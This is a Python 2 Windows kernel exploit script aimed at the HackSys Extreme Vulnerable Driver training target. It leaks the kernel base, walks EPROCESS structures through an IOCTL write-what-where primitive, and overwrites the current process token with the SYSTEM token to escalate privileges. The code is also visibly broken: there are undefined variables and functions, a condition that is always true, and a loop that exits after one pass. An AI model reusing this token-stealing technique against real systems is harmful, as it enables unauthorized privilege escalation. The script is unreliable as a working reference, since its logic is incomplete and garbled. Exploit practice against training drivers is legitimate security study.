#!/usr/bin/python
# -*- coding: utf-8 -*-

import ctypes
import struct
import sys
import os
import time
import platform
from ctypes import *
from ctypes.wintypes import *

############################################ Windows Constants ##############################################

ntdll = windll.ntdll
kernel32 = windll.kernel32
gdi32 = windll.gdi32
user32 = windll.user32

GENERIC_READ = 0x80000000
GENERIC_WRITE = 0x40000000
OPEN_EXISTING = 3
FORMAT_MESSAGE_FROM_SYSTEM = 0x00001000 
NULL = 0
STATUS_SUCCESS = 0
MOVEFILE_REPLACE_EXISTING = 0x01
CREATE_SUSPENDED = 0x00000004
THREADFUNC = CFUNCTYPE(None)
MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_EXECUTE_READWRITE = 0x00000040
PAGE_READWRITE = 0x00000004
ThreadBasicInformation = 0

PID_OFFSET = 0x2e0
NEXT_PROCESS_STRUCTURE_OFFSET = 0x2e8
PROCESS_TOKEN_OFFSET = 0x358

################################################### ADDRESSES FOR MSDN ######################################################

USERLAND_PAGE = 0x000000001a000000
USERLAND_PAGE_OFFSET1 = USERLAND_PAGE + 0x1000 # Arbitrary offset inside USERLAND_PAGE_OFFSET_uLL
USERLAND_PAGE_OFFSET2 = USERLAND_PAGE + 0x500 # Requires 16 byte offset in our defined user memory.
USERLAND_PAGE_OFFSET_uLL = c_ulonglong(USERLAND_PAGE)
USERLAND_PAGE_SIZE_uLL = c_ulonglong(0x3000)

KERNELLAND_TOKEN_ADDRESS = 0x00 #We don't know this yet.
CURRENT_PROCESS_HANDLE = 0xFFFFFFFFFFFFFFFF

###################################################### CHOSEN IOCTL CODE ##########################################################

IOCTL_code = 0x0022200B

###################################################### DEFINITIONS ##########################################################

ntdll.NtAllocateVirtualMemory.argtypes = [
    c_ulonglong,
    POINTER(c_ulonglong),
    c_ulonglong,
    POINTER(c_ulonglong),
    c_ulonglong,
    c_ulonglong,
    ]

kernel32.WriteProcessMemory.argtypes = [c_ulonglong, c_ulonglong,
        c_char_p, c_ulonglong, POINTER(c_ulonglong)]

kernel32.DeviceIoControl.argtypes = [
    c_void_p,
    c_ulong,
    c_void_p,
    c_ulong,
    c_void_p,
    c_ulong,
    POINTER(c_ulong),
    c_void_p,
    ]

kernel32.ReadProcessMemory.argtypes = [c_void_p, c_void_p, c_void_p,
        c_size_t, POINTER(c_size_t)]

ntdll.NtQueryInformationThread.argtypes = [c_void_p, c_ulonglong,
        c_void_p, c_ulong, POINTER(c_ulonglong)]

STATUS_SUCCESS = 0
written = c_size_t()
read = c_size_t()

dwStatus = ntdll.NtAllocateVirtualMemory(
    CURRENT_PROCESS_HANDLE,
    byref(USERLAND_PAGE_OFFSET_uLL),
    0,
    byref(_uLL),
    MEM_COMMIT | MEM_RESERVE,
    PAGE_EXECUTE_READWRITE,
    )

if dwStatus != STATUS_SUCCESS:
    print ('Something went wrong while allocating memory', 'e')
    sys.exit()


########################################## KERNEL BASE ################################################

def getKernelBaseAddress(driver):
    print '[*] Calling NtQuerySystemInformation w/SystemModuleInformation'
    sys_info = create_string_buffer(0)
    sys_info_len = c_ulong(0)

    ntdll.NtQuerySystemInformation(0xb, sys_info, len(sys_info), addressof(sys_info_len))

    sys_info = create_string_buffer(sys_info_len.value)

    result = ntdll.NtQuerySystemInformation(0xb, sys_info, len(sys_info), addressof(sys_info_len))

    if result == 0:
        print '[*] Success, allocated {}-byte result buffer'.format(str(len(sys_info)))
    else:
        print '[!] NtQuerySystemInformation failed with NTSTATUS: {}'.format(hex(result))

    class SYSTEM_MODULE_INFORMATION(Structure):

        _fields_ = [
            ('Reserved', c_void_p * 2),
            ('ImageBase', c_void_p),
            ('ImageSize', c_long),
            ('Flags', c_ulong),
            ('LoadOrderIndex', c_ushort),
            ('InitOrderIndex', c_ushort),
            ('LoadCount', c_ushort),
            ('ModuleNameOffset', c_ushort),
            ('ImageName', c_char * 256),
            ]

    handle_num = c_ulong(0)
    handle_num_str = create_string_buffer(sys_info.raw[:0x8])
    memmove(addressof(handle_num), handle_num_str, sizeof(handle_num))

    print '[*] Result buffer contains {} SystemModuleInformation objects'.format(str(handle_num.value))
    sys_info = create_string_buffer(sys_info.raw[0x8:])

    counter = 0
    for x in range(handle_num.value):
        tmp = SYSTEM_MODULE_INFORMATION()
        tmp_si = create_string_buffer(sys_info[counter:counter
                + sizeof(tmp)])
        memmove(addressof(tmp), tmp_si, sizeof(tmp))
        if 'ntoskrnl' or 'ntkrnl' in tmp.ImageName:
            img_name = tmp.ImageName.split('\\')[-0x01]
            print '[*] Kernel Type: {}'.format(img_name)
            kernel_base = hex(tmp.ImageBase)[:-0x01]
            print '[*] Kernel Base: {}'.format(kernel_base)
            
            return (img_name, long(kernel_base, 0))
    counter += sizeof(tmp)


########################################### CALCULATE OFFSETS FROM KERNEL #############################################

def getInitialSystemProcessStructure(kernel_base, img_name):

    kernel32.LoadLibraryA.restype = c_uint64
    kernel32.GetProcAddress.argtypes = [c_uint64, POINTER(c_char)]
    kernel32.GetProcAddress.restype = c_uint64

    # Load kernel image in userland and get PsInitialSystemProcess offset

    kernel_handle = kernel32.LoadLibraryA(img_name)
    print '[+] Loading %s in Userland' % img_name

    # print("[+] %s Userland Base Address : 0x%X" % (kernel_base, kernel_handle))

    PsISP_User_Address = kernel32.GetProcAddress(kernel_handle, 'PsInitialSystemProcess')
    print '[+] PsInitialSystemProcess Userland Base Address: 0x%X' % PsISP_User_Address

    # Calculate PsInitialSystemProcess offset in kernel land

    system_proc_struct_base_ptr = kernel_base + PsISP_User_Address - kernel_handle
    print '[+] PsInitialSystemProcess Kernel Base Address: 0x%X' % system_proc_struct_base_ptr

    PsISP_kernel_address = c_ulonglong()


    return long(system_proc_struct_base_ptr)

################################################### USER WRITE FUNCTION ###########################################################

def writeValueToUserland(driver, value, target_address):
    if not value:
        print("Can't write an empty value")
        sys.exit()

    if not target_address:
        print("Can't write to an empty target_address")
        sys.exit()

    dwStatus = kernel32.WriteProcessMemory(CURRENT_PROCESS_HANDLE, target_address, value, len(value), byref(written))
    if dwStatus == 0:
        print("Something went wrong in writeValueAtUserlandAddress","e")
        sys.exit()

def writeSystemTokenToUserland(driver, token, target_address):
    # Write the what value to target_address
    data = struct.pack("<Q", value)
    writeValueToUserland(data, target_address)

def writeIOCTLArgumentsToUserland(driver, token_ptr, target_address):
    data = struct.pack("<QQ", token_ptr, target_address)
    writeValueToUserland(driver, data, target_address)

def TellDriverToReadFromUserland(driver, ptr_to_value, target_address):
    # Pack the address of the what value and the address we want to write that value to
    
    IoControlCode = IOCTL_code
    InputBuffer = c_void_p(USERLAND_PAGE)
    InputBufferLength = 0x10
    OutputBuffer = c_void_p(0x0)
    OutputBufferLength = 0x0
    dwBytesReturned = c_ulong()
    lpBytesReturned = byref(dwBytesReturned)

    #print "Value before DeviceIoControl: %08x" % cast(USERLAND_PAGE_OFFSET_52POINTER(c_ulonglong))[0]
    triggerIOCTL = kernel32.DeviceIoControl(driver, IoControlCode, InputBuffer, InputBufferLength, OutputBuffer, OutputBufferLength, lpBytesReturned, NULL)
    print "Our memory target is: " + str(hex(USERLAND_PAGE_OFFSET1))
    print "I wrote this to our memory target: %08x" % cast(USERLAND_PAGE_OFFSET_52POINTER(c_ulonglong))[0]
    return triggerIOCTL


################################################### READ ###########################################################
                          # is it you want to read? #We are writing it back to userland memory.

def copyKernelDataToUserland(driver, kernel_address, userland_address):

    IoControlCode = IOCTL_code
    InputBuffer = c_void_p(1)
    InputBufferLength = 0x10
    OutputBuffer = c_void_p(0)
    OutputBufferLength = 0
    dwBytesReturned = c_ulong()
    lpBytesReturned = byref(dwBytesReturned)

    data = struct.pack('<QQ', kernel_address, userland_address)
    dwStatus = kernel32.WriteProcessMemory(CURRENT_PROCESS_HANDLE, USERLAND_PAGE, data, len(data), byref(written))

    triggerIOCTL = kernel32.DeviceIoControl(
        driver,
        IoControlCode,
        InputBuffer,
        InputBufferLength,
        OutputBuffer,
        OutputBufferLength,
        lpBytesReturned,
        NULL,
        )
 
    process_struct_ptr = cast(USERLAND_PAGE, POINTER(c_ulonglong))[0]

    return process_struct_ptr


############################## GET CURRENT PROCESS TOKEN OFFSET ################################

def get_current_eprocess(system_proc_struct_base_ptr, driver):
    """ Returns ptr to Current EPROCESS structure """
    
    flink = readPrimitive(driver, system_proc_struct_base_ptr + PROC_FLINK_OFFSET, USERLAND_PAGE)

    currentprocessBase = 0

    system_proc_struct_base_ptr = flink - PID_OFFSET - 0x8

    print "System Process Base Pointer", type(system_proc_struct_base_ptr), hex(system_proc_struct_base_ptr)

    print "Process ID: ", unique_process_id

    print c_ulonglong(unique_process_id).value

    flink = readPrimitive(driver, system_proc_struct_base_ptr + PROC_FLINK_OFFSET, USERLAND_PAGE)

    print "Flink ", hex(flink)
        
    base_pointer = flink - PID_OFFSET - 0x8

    return long(currentprocessBase)

####################################### GET DRIVER HANDLE ######################################
def getDriverHandle():

    driver = kernel32.CreateFileA( '\\\\.\\HackSysExtremeVulnerableDriver',
        GENERIC_READ | GENERIC_WRITE,
        0, None, 3, 0, None, )
 
    if not driver or driver == -0x01:
        print '[!] Driver handle not found :(\n'
        sys.exit()
    else:
        print '[X] Got handle to the driver.\n'

        return driver
        
########################################### MAIN ###############################################

def executeOverwrite():

    print "MAIN Getting Driver!"
    driver = getDriverHandle()
 
    print "MAIN Got Driver, getting Kernel Base!"
    (img_name, kernel_base) = getKernelBaseAddress(driver)

    # Get system process base address
    print "MAIN Got Kernel Base, Getting System Process Base!"
    system_process_struct = getInitialSystemProcessStructure(kernel_base, img_name)

    # Read the value of that token.

    print "MAIN Got System Process Base, Getting System Token!"

    #triggerIOCTL, process_struct_ptr = readPrimitive(driver, system_proc_struct_base_ptr, USERLAND_PAGE)
    process_struct_ptr = copyKernelDataToUserland(driver, system_process_struct + PROC_FLINK_OFFSET, USERLAND_PAGE)

    # Get kernel base address

    # Define our expected offsets for this version of Windows.

    print "MAIN We know the proper offsets now."
    system_token = system_proc_struct_base_ptr + TOKEN_OFFSET

    current_proc_base_struct_ptr = system_proc_struct_base_ptr

    counter = 0

    while True:

        if counter > 0:
            break
        counter+=1

        next_proc_struct = readProcessStruct()


        next_proc_struct = readPrimitive(driver, current_proc_base_struct_ptr + PROC_FLINK_OFFSET, USERLAND_PAGE)
        if next_proc_struct == system_proc_struct_base_ptr:
            break
    
        current_proc_base_struct_ptr = next_proc_struct

        print "Process Base Pointer", type(current_proc_base_struct_ptr), hex(current_proc_base_struct_ptr)

        current_token = current_proc_base_struct_ptr + TOKEN_OFFSET

                                #what              #where                                
        writeValueAtAddress(driver, process_struct_ptr, USERLAND_PAGE_OFFSET2)

        #print "MAIN Attempting system to current token overwrite!"
                                    #what         #where
        writeValueAtAddress(driver, system_token, current_token)

        #success = writePrimitive(driver, system_token, current_token, system_token)

    #print "MAIN Success!"
############################################ RUN ################################################

executeOverwrite()
